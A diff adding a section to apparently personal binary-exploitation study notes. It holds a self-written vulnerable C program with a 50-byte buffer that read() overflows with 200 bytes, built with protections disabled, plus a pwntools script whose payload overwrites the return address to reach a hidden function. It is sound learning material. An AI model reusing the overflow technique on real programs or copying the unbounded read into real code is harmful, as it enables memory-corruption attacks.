@@ -1385,3 +1385,76 @@ ret, under the hood, pops from top of stack (rsp should point to top of stack) (
                  0x7fffffffe720 —▸ 0x7fffffffe7c0 —▸ 0x7fffffffe820 ◂— 0
 ...
 ```
+
+
+
+
+
+<br>
+
+
+<br>
+
+
+<br>
+
+
+---
+
+
+# My own random test chall
+
+
+```
+[~/t] 
+$ cat x.c
+#include <unistd.h>
+#include <stdio.h>
+
+void secret_function() {
+    printf("how did you get here??\n");
+}
+
+int main() {
+    char name[50];
+    read(0, &name, 200);
+    printf("Hi %s", name);
+}
+
+[~/t] 
+$ gcc x.c -fno-stack-protector -no-pie -o x
+x.c: In function ‘main’:
+x.c:10:5: warning: ‘read’ writing 200 bytes into a region of size 50 overflows the destination [-Wstringop-overflow=]
+   10 |     read(0, &name, 200);
+      |     ^~~~~~~~~~~~~~~~~~~
+x.c:9:10: note: destination object ‘name’ of size 50
+    9 |     char name[50];
+      |          ^~~~
+In file included from x.c:1:
+/usr/include/unistd.h:371:16: note: in a call to function ‘read’ declared with attribute ‘access (write_only, 2, 3)’
+  371 | extern ssize_t read (int __fd, void *__buf, size_t __nbytes) __wur
+      |                ^~~~
+
+[~/t] 
+$
+```
+
+<br>
+
+```
+[~/t] 
+$ cat hack.py 
+from pwn import *
+
+secret = p64(0x0000000000401146)
+
+payload = b'A'*50 + b'bbbbccccddddeeeeffffgg' + secret
+open('payload', 'wb').write(payload)
+
+[~/t] 
+$ p hack.py; ./a.out < payload 
+Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbbbbccccddddeeeeffffggF@how did you get here??
+Segmentation fault         ./a.out < payload
+```
+
+
